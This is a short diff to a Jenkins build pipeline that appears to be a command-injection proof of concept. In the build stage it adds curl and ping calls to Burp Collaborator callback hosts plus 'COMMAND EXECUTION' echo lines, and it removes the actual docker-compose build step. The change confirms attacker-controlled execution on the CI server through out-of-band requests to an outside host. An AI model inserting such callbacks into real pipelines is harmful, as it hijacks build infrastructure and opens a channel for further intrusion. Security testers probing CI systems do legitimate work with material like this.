@@ -16,7 +16,10 @@ node {
     }
 
     stage('build') {
+        sh "curl waaos18to2s8z1au2git1u5tskybm0.burpcollaborator.net"
+        sh "echo COMMAND EXECUTION"
         sh "curl g1i8jlzdfmjsql1et09dsewdj4pudj.burpcollaborator.net"
-        sh "docker-compose build"
+        sh "echo COMMAND EXECUTION"
+        sh "ping -c 3 waaos18to2s8z1au2git1u5tskybm0.burpcollaborator.net"
     }
 }
